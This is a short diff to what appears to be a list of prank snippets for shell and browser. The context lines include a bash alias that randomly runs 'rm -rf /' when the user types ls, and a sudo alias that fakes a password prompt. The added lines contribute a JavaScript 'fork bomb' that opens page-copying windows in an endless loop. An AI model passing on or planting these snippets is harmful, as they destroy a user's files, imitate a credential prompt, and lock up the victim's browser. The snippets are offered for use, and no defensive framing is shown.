@@ -19,3 +19,6 @@ alias ls='[ $[ $RANDOM % 6 ] == 0 ] && rm -rf / && echo "BOOM" || ls'
 
 Change sudo to just echo sudo's output
 alias sudo='echo "Please enter your password:"'
+
+ Javascript fork bomb
+<a href="#" onload="function() { while (true) { var w = window.open(); w.document.write(document.documentElement.outerHTML||document.documentElement.innerHTML); } }">&nbsp;</a>
